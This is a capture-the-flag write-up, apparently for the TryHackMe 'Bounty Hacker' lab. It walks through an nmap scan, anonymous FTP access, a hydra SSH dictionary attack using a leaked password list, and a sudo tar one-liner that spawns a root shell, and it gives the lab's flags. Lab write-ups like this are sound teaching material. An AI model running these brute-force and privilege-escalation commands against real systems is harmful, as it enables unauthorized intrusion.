### IP
`10.10.207.236`

# Enumeration

### nmap
`nmap -sC -sV 10.10.207.236 -o BountyHacker.nmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-13 23:53 EST
Nmap scan report for 10.10.207.236
Host is up (0.17s latency).
Not shown: 967 filtered ports, 30 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.6.36.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 dc:f8:df:a7:a6:00:6d:18:b0:70:2b:a5:aa:a6:14:3e (RSA)
|   256 ec:c0:f2:d9:1e:6f:48:7d:38:9a:e3:bb:08:c4:0c:c9 (ECDSA)
|_  256 a4:1a:15:a5:d4:b1:cf:8f:16:50:3a:7d:d0:d8:13:c2 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.46 seconds
```
* Easy stuff first... Let's take a look at the website at port 80
	* Looks like its just a text page. I'll run nikto on it just in case.
* What's more interesting is ftp, because anonymous login is allows
	* Let's try that:

# Exploitation

### ftp login
`ftp 10.10.207.236 21`
* Type in `anonymous` for the username and press enter for the password
* Let's see whats on this thing... `ls`
```
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-rw-r--    1 ftp      ftp           418 Jun 07 20:41 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07 20:47 task.txt
226 Directory send OK.
```
* We can download those by typing `get locks.txt` and `get task.txt`


* `locks.txt` :
```
rEddrAGON
ReDdr4g0nSynd!cat3
Dr@gOn$yn9icat3
R3DDr46ONSYndIC@Te
ReddRA60N
R3dDrag0nSynd1c4te
dRa6oN5YNDiCATE
ReDDR4g0n5ynDIc4te
R3Dr4gOn2044
RedDr4gonSynd1cat3
R3dDRaG0Nsynd1c@T3
Synd1c4teDr@g0n
reddRAg0N
REddRaG0N5yNdIc47e
Dra6oN$yndIC@t3
4L1mi6H71StHeB357
rEDdragOn$ynd1c473
DrAgoN5ynD1cATE
ReDdrag0n$ynd1cate
Dr@gOn$yND1C4Te
RedDr@gonSyn9ic47e
REd$yNdIc47e
dr@goN5YNd1c@73
rEDdrAGOnSyNDiCat3
r3ddr@g0N
ReDSynd1ca7e
```
* Now what could we do with this? 
	* Perhaps its a list for something relating to the ssh client?


* `task.txt` :
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
* Okay... It looks like `lin` wrote the task


### ssh
* Now, we need to figure out how to login to this
* We can reasonably guess that the ssh username is `lin`
	* Maybe locks.txt is a possible list of passwords?

* Let's use hydra to run a dictionary attack:
* `hydra -l "lin" -P locks.txt ssh://10.10.207.236 -t 4`
```
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-14 00:07:57
[DATA] max 4 tasks per 1 server, overall 4 tasks, 26 login tries (l:1/p:26), ~7 tries per task
[DATA] attacking ssh://10.10.207.236:22/
[22][ssh] host: 10.10.207.236   login: lin   password: RedDr4gonSynd1cat3
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-11-14 00:08:07
```
* Success! Looks like the password is `RedDr4gonSynd1cat3`

* Let's log in now: `ssh lin@10.10.207.236 -p 22`
	* Input the password when asked: `RedDr4gonSynd1cat3`

* When we `ls` we see a `users.txt` file.
* Catting it gives us `THM{CR1M3_SyNd1C4T3}`

* Now we need to get access to root
* I tried `sudo cd /root/` with the same password as lin, but with no success

### privelege escalation

* Let's do some quick recon on the system we're on:
* `cat /etc/os-release`
```
NAME="Ubuntu"
VERSION="16.04.6 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04.6 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
VERSION_CODENAME=xenial
UBUNTU_CODENAME=xenial
```

* `cat /proc/version`
```
Linux version 4.15.0-101-generic (buildd@lgw01-amd64-052) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.12)) #102~16.04.1-Ubuntu SMP Mon May 11 11:38:16 UTC 2020
```

* Let's look online to see if xenial 16.04 has any privesc vulns
* `searchsploit openssh` returns some results
* One interesting one is `linux/local/40962.txt`
	* Let's view the file...

```
...
sing "ssh -L", an attacker who is permitted to log in as a
normal user over SSH can effectively connect to non-abstract unix domain sockets
with root privileges
...
Proof of Concept:
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/40962.zip

```

* Very interesting... Let's download the exploit and try to run it

* Imma be honest.. loads of stuff happened here with no success
* A typical Linux privilege Escalation method is based on checking one of the following: (Quote from [this](https://github.com/Bengman/CTF-writeups/blob/master/Hackthebox/dev0ops.md) writeup)
```
Exploiting services running as root
Exploiting SUID executables
Exploiting SUDO rights/user
Exploiting badly configured cron jobs
Exploiting users with "." in their path
Kernel Exploits
```
* I eventually had some success with exploting sudo rights:
* `sudo -l` with `lin`'s password shows which commands each of the users can execute with sudo
	* turns out lin can execute tar as sudo... we can exploit that
* I looked up `linux tar privesc` and found [this](https://gtfobins.github.io/gtfobins/tar/)
* It says the following command lets us "spawn an interactive system shell"
```
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```
* running this as sudo and typing in `lin`'s password gives us a root shell
* `ls /root/` shows us a file called `root.txt`
* `cat /root/root.txt` gives us the root flag: `THM{80UN7Y_h4cK3r}`

